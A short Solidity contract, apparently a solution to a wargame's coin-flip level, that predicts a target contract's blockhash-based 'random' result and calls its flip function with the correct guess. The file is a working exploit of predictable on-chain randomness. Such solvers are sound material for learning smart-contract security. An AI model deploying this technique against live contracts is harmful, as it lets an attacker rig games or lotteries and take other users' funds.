// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract FlipSolver {

    //No need for the safemath because of the jump in compiler version it's now included.
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function solve(address target) external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
        revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool res = Target(target).flip(side);

        if (!res) { 
            revert("failed to guess");
        }
    }
}

interface Target {
    function flip(bool guess) external returns (bool);
}
